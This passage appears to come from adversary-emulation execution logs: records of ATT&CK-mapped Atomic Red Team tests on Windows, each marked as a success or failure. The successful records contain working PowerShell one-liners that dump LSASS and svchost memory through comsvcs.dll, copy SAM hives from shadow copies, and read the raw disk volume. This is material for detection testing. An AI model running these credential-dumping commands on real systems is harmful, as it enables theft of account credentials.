+                      "'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); "
+                      '$handle.Close(); Format-Hex -InputObject $buffer',
+ 'platform': 'windows',
+ 'run': '2023-11-09T20:07:49Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_006__credential-access__os_credential_dumping-_dcsync__88d78618bbba0ca862d8d5a6f6fb4d72__trial_3
+
+atomic_ordering: ['88d78618bbba0ca862d8d5a6f6fb4d72']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6__trial_2
+
+atomic_ordering: ['80e752c5fc69a56ccb86bc90efc5eff6']
+------------------------------
+{'ability_id': '80e752c5fc69a56ccb86bc90efc5eff6',
+ 'agent_reported_time': '2023-11-08T14:52:32Z',
+ 'attack': {'tactic': 'defense-evasion',
+            'technique_id': 'T1006',
+            'technique_name': 'Direct Volume Access'},
+ 'command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+            'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', \'ReadWrite\'; '
+            '$handle.Read($buffer, 0, $buffer.Length); $handle.Close(); '
+            'Format-Hex -InputObject $buffer',
+ 'delegated': '2023-11-09T19:13:04Z',
+ 'description': 'This test uses PowerShell to open a handle on the drive '
+                'volume via the `\\\\.\\` [DOS device path '
+                'specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) '
+                'and perform direct access read of the first few bytes of the '
+                'volume.\n'
+                'On success, a hex dump of the first 11 bytes of the volume is '
+                'displayed.\n'
+                '\n'
+                'For a NTFS volume, it should correspond to the following '
+                'sequence ([NTFS partition boot '
+                'sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n'
+                '```\n'
+                '           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n'
+                '\n'
+                '00000000   EB 52 90 4E 54 46 53 20 20 20 20                 '
+                'ëR?NTFS\n'
+                '```',
+ 'executor': 'psh',
+ 'link_id': 'ec0adbcc-fb50-4219-989e-2ff78ae78215',
+ 'name': 'Read volume boot sector via DOS device path (PowerShell)',
+ 'pid': 4244,
+ 'plaintext_command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+                      'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', '
+                      "'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); "
+                      '$handle.Close(); Format-Hex -InputObject $buffer',
+ 'platform': 'windows',
+ 'run': '2023-11-09T19:13:15Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__f6c693da77b8824b3c52ba3b6ca0bf88__trial_3
+
+atomic_ordering: ['f6c693da77b8824b3c52ba3b6ca0bf88']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_006__credential-access__os_credential_dumping-_dcsync__88d78618bbba0ca862d8d5a6f6fb4d72__trial_4
+
+atomic_ordering: ['88d78618bbba0ca862d8d5a6f6fb4d72']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__8de14c0ea1b80dbd5de0cf5d28cff16b__trial_4
+
+atomic_ordering: ['8de14c0ea1b80dbd5de0cf5d28cff16b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212__trial_5
+
+atomic_ordering: ['3bcfa369fd1f214e4d05944228eeb212']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e__trial_1
+
+atomic_ordering: ['18f31c311ac208802e88ab8d5af8603e']
+------------------------------
+{'ability_id': '18f31c311ac208802e88ab8d5af8603e',
+ 'agent_reported_time': '2023-11-08T14:53:28Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003',
+            'technique_name': 'OS Credential Dumping'},
+ 'command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established '
+            '-ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else '
+            '{$id = (Get-Process svchost)[0].Id }; '
+            'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+            '$env:TEMP\\svchost-exe.dmp full',
+ 'delegated': '2023-11-09T09:38:20Z',
+ 'description': 'The svchost.exe contains the RDP plain-text credentials.\n'
+                'Source: '
+                'https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\svchost-exe.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': 'f5d3cbdd-d214-47e3-bccb-193e62dc614a',
+ 'name': 'Dump svchost.exe to gather RDP credentials',
+ 'pid': 6160,
+ 'plaintext_command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State '
+                      'Established -ErrorAction Ignore); if($ps){$id = '
+                      '$ps[0].OwningProcess} else {$id = (Get-Process '
+                      'svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+                      '$env:TEMP\\svchost-exe.dmp full',
+ 'platform': 'windows',
+ 'run': '2023-11-09T09:38:42Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__trial_3
+
+atomic_ordering: ['35d92515122effdd73801c6ac3021da7']
+------------------------------
+{'ability_id': '35d92515122effdd73801c6ac3021da7',
+ 'agent_reported_time': '2023-11-08T17:33:01Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.001',
+            'technique_name': 'OS Credential Dumping: LSASS Memory'},
+ 'command': 'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
+            'lsass).id $env:TEMP\\lsass-comsvcs.dmp full',
+ 'delegated': '2023-11-08T17:32:57Z',
+ 'description': 'The memory of lsass.exe is often dumped for offline '
+                'credential theft attacks. This can be achieved with a '
+                'built-in dll.\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\lsass-comsvcs.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': 'f13f8768-fe41-40b6-815f-a63f052bd426',
+ 'name': 'Dump LSASS.exe Memory using comsvcs.dll',
+ 'pid': 5084,
+ 'plaintext_command': 'C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump '
+                      '(Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp '
+                      'full',
+ 'platform': 'windows',
+ 'run': '2023-11-08T17:33:05Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40__trial_5
+
+atomic_ordering: ['69219b448ba0a75bae573d58d8b6cf40']
+------------------------------
+{'ability_id': '69219b448ba0a75bae573d58d8b6cf40',
+ 'agent_reported_time': '2023-11-09T06:14:02Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.002',
+            'technique_name': 'OS Credential Dumping: Security Account '
+                              'Manager'},
+ 'command': '1..10 | % { ;  try { '
+            '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+            ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+            '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'delegated': '2023-11-09T06:13:35Z',
+ 'description': 'Dump hives from volume shadow copies with System.IO.File. '
+                '[CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n',
+ 'executor': 'psh',
+ 'link_id': '8d21887e-7bd4-4f4d-bc80-503c65ad02b1',
+ 'name': 'dump volume shadow copy hives with System.IO.File',
+ 'pid': 4648,
+ 'plaintext_command': '1..10 | % { ;  try { '
+                      '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+                      ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+                      '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'platform': 'windows',
+ 'run': '2023-11-09T06:14:03Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__2cc37a6cf2f1acdeaa6a6638016444d1__trial_5
+
+atomic_ordering: ['2cc37a6cf2f1acdeaa6a6638016444d1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e__trial_5
+
+atomic_ordering: ['18f31c311ac208802e88ab8d5af8603e']
+------------------------------
+{'ability_id': '18f31c311ac208802e88ab8d5af8603e',
+ 'agent_reported_time': '2023-11-08T14:52:20Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003',
+            'technique_name': 'OS Credential Dumping'},
+ 'command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established '
+            '-ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else '
+            '{$id = (Get-Process svchost)[0].Id }; '
+            'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+            '$env:TEMP\\svchost-exe.dmp full',
+ 'delegated': '2023-11-09T10:52:28Z',
+ 'description': 'The svchost.exe contains the RDP plain-text credentials.\n'
+                'Source: '
+                'https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\svchost-exe.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': '9b9b73d5-0a65-4375-8bc9-5d3bc4638ac6',
+ 'name': 'Dump svchost.exe to gather RDP credentials',
+ 'pid': 6836,
+ 'plaintext_command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State '
+                      'Established -ErrorAction Ignore); if($ps){$id = '
+                      '$ps[0].OwningProcess} else {$id = (Get-Process '
+                      'svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+                      '$env:TEMP\\svchost-exe.dmp full',
+ 'platform': 'windows',
+ 'run': '2023-11-09T10:53:00Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__24a6ff3816824ecae285f847995709cf__trial_5
+
+atomic_ordering: ['24a6ff3816824ecae285f847995709cf']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__60bb6f8468aa98b75be2521861a164d5__trial_1
+
+atomic_ordering: ['60bb6f8468aa98b75be2521861a164d5']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1016__discovery__system_network_configuration_discovery__db1bb4f8462260edf0e7c4b892dd66ca__trial_4
+
+atomic_ordering: ['db1bb4f8462260edf0e7c4b892dd66ca']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212__trial_4
+
+atomic_ordering: ['3bcfa369fd1f214e4d05944228eeb212']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__f6c693da77b8824b3c52ba3b6ca0bf88__trial_5
+
+atomic_ordering: ['f6c693da77b8824b3c52ba3b6ca0bf88']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__bbc786e45aff314d33e60133f010f00c__trial_5
+
+atomic_ordering: ['bbc786e45aff314d33e60133f010f00c']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e__trial_4
+
+atomic_ordering: ['18f31c311ac208802e88ab8d5af8603e']
+------------------------------
+{'ability_id': '18f31c311ac208802e88ab8d5af8603e',
+ 'agent_reported_time': '2023-11-08T14:53:42Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003',
+            'technique_name': 'OS Credential Dumping'},
+ 'command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established '
+            '-ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else '
+            '{$id = (Get-Process svchost)[0].Id }; '
+            'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+            '$env:TEMP\\svchost-exe.dmp full',
+ 'delegated': '2023-11-09T10:34:43Z',
+ 'description': 'The svchost.exe contains the RDP plain-text credentials.\n'
+                'Source: '
+                'https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\svchost-exe.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': 'bebaead2-2b6e-4dee-9616-e938a85b641b',
+ 'name': 'Dump svchost.exe to gather RDP credentials',
+ 'pid': 9384,
+ 'plaintext_command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State '
+                      'Established -ErrorAction Ignore); if($ps){$id = '
+                      '$ps[0].OwningProcess} else {$id = (Get-Process '
+                      'svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+                      '$env:TEMP\\svchost-exe.dmp full',
+ 'platform': 'windows',
+ 'run': '2023-11-09T10:35:09Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40__trial_3
+
+atomic_ordering: ['69219b448ba0a75bae573d58d8b6cf40']
+------------------------------
+{'ability_id': '69219b448ba0a75bae573d58d8b6cf40',
+ 'agent_reported_time': '2023-11-09T05:38:36Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.002',
+            'technique_name': 'OS Credential Dumping: Security Account '
+                              'Manager'},
+ 'command': '1..10 | % { ;  try { '
+            '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+            ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+            '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'delegated': '2023-11-09T05:38:25Z',
+ 'description': 'Dump hives from volume shadow copies with System.IO.File. '
+                '[CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n',
+ 'executor': 'psh',
+ 'link_id': '8d3a9fb5-b6bb-437d-a24d-b1002c6da9b7',
+ 'name': 'dump volume shadow copy hives with System.IO.File',
+ 'pid': 7028,
+ 'plaintext_command': '1..10 | % { ;  try { '
+                      '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+                      ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+                      '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'platform': 'windows',
+ 'run': '2023-11-09T05:38:37Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__2cc37a6cf2f1acdeaa6a6638016444d1__trial_3
+
+atomic_ordering: ['2cc37a6cf2f1acdeaa6a6638016444d1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e__trial_3
+
+atomic_ordering: ['18f31c311ac208802e88ab8d5af8603e']
+------------------------------
+{'ability_id': '18f31c311ac208802e88ab8d5af8603e',
+ 'agent_reported_time': '2023-11-08T14:53:38Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003',
+            'technique_name': 'OS Credential Dumping'},
+ 'command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established '
+            '-ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else '
+            '{$id = (Get-Process svchost)[0].Id }; '
+            'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+            '$env:TEMP\\svchost-exe.dmp full',
+ 'delegated': '2023-11-09T10:15:40Z',
+ 'description': 'The svchost.exe contains the RDP plain-text credentials.\n'
+                'Source: '
+                'https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\svchost-exe.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': 'abfc4b6f-30cc-428e-b1e9-d6a1ea78f208',
+ 'name': 'Dump svchost.exe to gather RDP credentials',
+ 'pid': 8196,
+ 'plaintext_command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State '
+                      'Established -ErrorAction Ignore); if($ps){$id = '
+                      '$ps[0].OwningProcess} else {$id = (Get-Process '
+                      'svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+                      '$env:TEMP\\svchost-exe.dmp full',
+ 'platform': 'windows',
+ 'run': '2023-11-09T10:16:22Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__18f31c311ac208802e88ab8d5af8603e__trial_2
+
+atomic_ordering: ['18f31c311ac208802e88ab8d5af8603e']
+------------------------------
+{'ability_id': '18f31c311ac208802e88ab8d5af8603e',
+ 'agent_reported_time': '2023-11-08T14:52:54Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003',
+            'technique_name': 'OS Credential Dumping'},
+ 'command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established '
+            '-ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else '
+            '{$id = (Get-Process svchost)[0].Id }; '
+            'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+            '$env:TEMP\\svchost-exe.dmp full',
+ 'delegated': '2023-11-09T09:56:39Z',
+ 'description': 'The svchost.exe contains the RDP plain-text credentials.\n'
+                'Source: '
+                'https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\svchost-exe.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': '3b7914b0-cd58-4661-b19e-db4a4bcda590',
+ 'name': 'Dump svchost.exe to gather RDP credentials',
+ 'pid': 1736,
+ 'plaintext_command': '$ps = (Get-NetTCPConnection -LocalPort 3389 -State '
+                      'Established -ErrorAction Ignore); if($ps){$id = '
+                      '$ps[0].OwningProcess} else {$id = (Get-Process '
+                      'svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump $id '
+                      '$env:TEMP\\svchost-exe.dmp full',
+ 'platform': 'windows',
+ 'run': '2023-11-09T09:57:02Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__54f95564a265f67159d1f8ff907cd156__trial_4
+
+atomic_ordering: ['54f95564a265f67159d1f8ff907cd156']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__8de14c0ea1b80dbd5de0cf5d28cff16b__trial_1
+
+atomic_ordering: ['8de14c0ea1b80dbd5de0cf5d28cff16b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__bbc786e45aff314d33e60133f010f00c__trial_1
+
+atomic_ordering: ['bbc786e45aff314d33e60133f010f00c']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__trial_5
+
+atomic_ordering: ['35d92515122effdd73801c6ac3021da7']
+------------------------------
+{'ability_id': '35d92515122effdd73801c6ac3021da7',
+ 'agent_reported_time': '2023-11-08T18:10:51Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.001',
+            'technique_name': 'OS Credential Dumping: LSASS Memory'},
+ 'command': 'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
+            'lsass).id $env:TEMP\\lsass-comsvcs.dmp full',
+ 'delegated': '2023-11-08T18:10:08Z',
+ 'description': 'The memory of lsass.exe is often dumped for offline '
+                'credential theft attacks. This can be achieved with a '
+                'built-in dll.\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\lsass-comsvcs.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': 'fa14dd3a-f649-4998-b173-50c2951f0711',
+ 'name': 'Dump LSASS.exe Memory using comsvcs.dll',
+ 'pid': 10256,
+ 'plaintext_command': 'C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump '
+                      '(Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp '
+                      'full',
+ 'platform': 'windows',
+ 'run': '2023-11-08T18:10:56Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__36fc42ced381416ca7d5d7af0ee0561b__trial_2
+
+atomic_ordering: ['36fc42ced381416ca7d5d7af0ee0561b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__82dcefb5c3512d73bf2248cb0127c4ae__trial_1
+
+atomic_ordering: ['82dcefb5c3512d73bf2248cb0127c4ae']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6__trial_4
+
+atomic_ordering: ['80e752c5fc69a56ccb86bc90efc5eff6']
+------------------------------
+{'ability_id': '80e752c5fc69a56ccb86bc90efc5eff6',
+ 'agent_reported_time': '2023-11-08T14:53:16Z',
+ 'attack': {'tactic': 'defense-evasion',
+            'technique_id': 'T1006',
+            'technique_name': 'Direct Volume Access'},
+ 'command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+            'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', \'ReadWrite\'; '
+            '$handle.Read($buffer, 0, $buffer.Length); $handle.Close(); '
+            'Format-Hex -InputObject $buffer',
+ 'delegated': '2023-11-09T19:49:36Z',
+ 'description': 'This test uses PowerShell to open a handle on the drive '
+                'volume via the `\\\\.\\` [DOS device path '
+                'specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) '
+                'and perform direct access read of the first few bytes of the '
+                'volume.\n'
+                'On success, a hex dump of the first 11 bytes of the volume is '
+                'displayed.\n'
+                '\n'
+                'For a NTFS volume, it should correspond to the following '
+                'sequence ([NTFS partition boot '
+                'sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n'
+                '```\n'
+                '           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n'
+                '\n'
+                '00000000   EB 52 90 4E 54 46 53 20 20 20 20                 '
+                'ëR?NTFS\n'
+                '```',
+ 'executor': 'psh',
+ 'link_id': '2529713e-cd59-4bc1-bd58-abdd4cb9aef5',
+ 'name': 'Read volume boot sector via DOS device path (PowerShell)',
+ 'pid': 8844,
+ 'plaintext_command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+                      'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', '
+                      "'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); "
+                      '$handle.Close(); Format-Hex -InputObject $buffer',
+ 'platform': 'windows',
+ 'run': '2023-11-09T19:49:48Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__82dcefb5c3512d73bf2248cb0127c4ae__trial_5
+
+atomic_ordering: ['82dcefb5c3512d73bf2248cb0127c4ae']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__36fc42ced381416ca7d5d7af0ee0561b__trial_5
+
+atomic_ordering: ['36fc42ced381416ca7d5d7af0ee0561b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212__trial_2
+
+atomic_ordering: ['3bcfa369fd1f214e4d05944228eeb212']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003.001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__trial_1
+
+atomic_ordering: ['35d92515122effdd73801c6ac3021da7']
+------------------------------
+{'ability_id': '35d92515122effdd73801c6ac3021da7',
+ 'agent_reported_time': '2023-11-08T16:06:11Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.001',
+            'technique_name': 'OS Credential Dumping: LSASS Memory'},
+ 'command': 'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
+            'lsass).id $env:TEMP\\lsass-comsvcs.dmp full',
+ 'delegated': '2023-11-08T16:06:00Z',
+ 'description': 'The memory of lsass.exe is often dumped for offline '
+                'credential theft attacks. This can be achieved with a '
+                'built-in dll.\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\lsass-comsvcs.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': 'ebf00d0b-de4e-443c-8a57-447b0c149f29',
+ 'name': 'Dump LSASS.exe Memory using comsvcs.dll',
+ 'pid': 6064,
+ 'plaintext_command': 'C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump '
+                      '(Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp '
+                      'full',
+ 'platform': 'windows',
+ 'run': '2023-11-08T16:06:26Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__691d489fe77afbfe8646419fce6759fd__trial_4
+
+atomic_ordering: ['691d489fe77afbfe8646419fce6759fd']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1__trial_5
+
+atomic_ordering: ['8e01631039faf6a9a84df376bf9ad0f1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__82dcefb5c3512d73bf2248cb0127c4ae__trial_3
+
+atomic_ordering: ['82dcefb5c3512d73bf2248cb0127c4ae']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212__trial_1
+
+atomic_ordering: ['3bcfa369fd1f214e4d05944228eeb212']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_003__credential-access__os_credential_dumping-_ntds__6dc5c587fd22d65b81a443b7ce065ab1__trial_1
+
+atomic_ordering: ['6dc5c587fd22d65b81a443b7ce065ab1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40__trial_1
+
+atomic_ordering: ['69219b448ba0a75bae573d58d8b6cf40']
+------------------------------
+{'ability_id': '69219b448ba0a75bae573d58d8b6cf40',
+ 'agent_reported_time': '2023-11-09T05:03:04Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.002',
+            'technique_name': 'OS Credential Dumping: Security Account '
+                              'Manager'},
+ 'command': '1..10 | % { ;  try { '
+            '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+            ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+            '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'delegated': '2023-11-09T05:02:58Z',
+ 'description': 'Dump hives from volume shadow copies with System.IO.File. '
+                '[CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n',
+ 'executor': 'psh',
+ 'link_id': '366b2605-65df-444b-a0f8-503280f932dc',
+ 'name': 'dump volume shadow copy hives with System.IO.File',
+ 'pid': 7100,
+ 'plaintext_command': '1..10 | % { ;  try { '
